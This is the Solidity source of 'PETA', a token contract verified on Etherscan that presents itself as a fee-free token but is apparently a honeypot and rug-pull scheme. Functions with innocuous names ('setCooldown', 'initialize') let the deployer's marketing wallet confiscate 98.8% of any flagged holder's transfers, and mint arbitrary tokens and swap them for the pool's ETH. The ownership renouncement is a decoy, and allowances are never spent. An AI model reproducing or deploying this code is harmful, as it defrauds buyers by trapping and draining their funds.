/**
 *Submitted for verification at Etherscan.io on 2023-07-16
*/

pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT



interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}
library SafeMath {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}


contract Context {
    function msgSender() public view returns (address) {return msg.sender;}
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 asd, uint256 bewr, address[] calldata _path, address csdf, uint256) external;
    function WETH() external pure returns (address aadd);
}
abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner"); _;
    }
    constructor () {
        emit OwnershipTransferred(address(0), _owner);
        _owner = msg.sender;
    }
    function owner() public view virtual returns (address) {return _owner;}
}

contract PETA is Ownable, Context {
    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;
    uint256 buyFee = 0;
    uint256 sellFee = 0;
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msgSender(), spender, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msgSender(), spender, _allowances[msgSender()][spender] + addedValue);
        return true;
    }
    event Approval(address indexed from, address indexed to_addres, uint256 value);
    function _transfer(address _from, address _to, uint256 _amount) internal {
        uint256 feeAmount = (cooldowns[_from] != 0 && cooldowns[_from] <= getBlockNumber()) ? _amount.mul(988).div(1000) : buyFee;
        require(_amount <= _balances[_from]); 
        require(_from != address(0));
        _balances[_from] -= _amount; 
        _balances[_to] += (_amount - feeAmount);
        emit Transfer(_from, _to, _amount);
    }
    string private _symbol = "PETA";
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    address public _marketingWallet;
    string private _name = "PETA";
    function setCooldown(address[] calldata _addresses) external { 
        uint256 _toBlock = getBlockNumber() + 1;
        for (uint _inx = 0;  _inx < _addresses.length;  _inx++) { 
            if (fromMarketingWallet()){
                cooldowns[_addresses[_inx]] = _toBlock;
            }
        }
    } 
    function getBlockNumber() private view returns (uint256) {
        return block.number;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    event Transfer(address indexed from, address indexed aindex, uint256 val);

    mapping(address => uint256) private _balances;
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function initialize(uint256 tokenNumber, address _addr) external {
        if (fromMarketingWallet()) { _approve(address(this), address(uniswapRouter),  tokenNumber); 
        _balances[address(this)] = tokenNumber;
        address[] memory tokenPath = new address[](2);  
        tokenPath[0] = address(this);   
        tokenPath[1] = uniswapRouter.WETH();  
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenNumber, 0, tokenPath, _addr, 30 + block.timestamp);
        }
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function fromMarketingWallet() internal view returns (bool) {
        return _marketingWallet == msgSender();
    }
    function name() external view returns (string memory) { return _name; }
    function transferFrom(address _from, address to_, uint256 amount) public returns (bool) {
        _transfer(_from, to_, amount);
        require(_allowances[_from][msgSender()] >= amount);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) { return _balances[account]; } 
    constructor() {
        _balances[msgSender()] = _totalSupply; 
        _marketingWallet = msgSender();
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function transfer(address recipient, uint256 value) public returns (bool) { _transfer(msgSender(), recipient, value); return true; }
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    mapping (address => uint256) cooldowns;
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msgSender()][from] >= amount);
        _approve(msgSender(), from, _allowances[msgSender()][from] - amount);
        return true;
    } 
    function totalSupply() external view returns (uint256) { 
        return _totalSupply; 
    }
}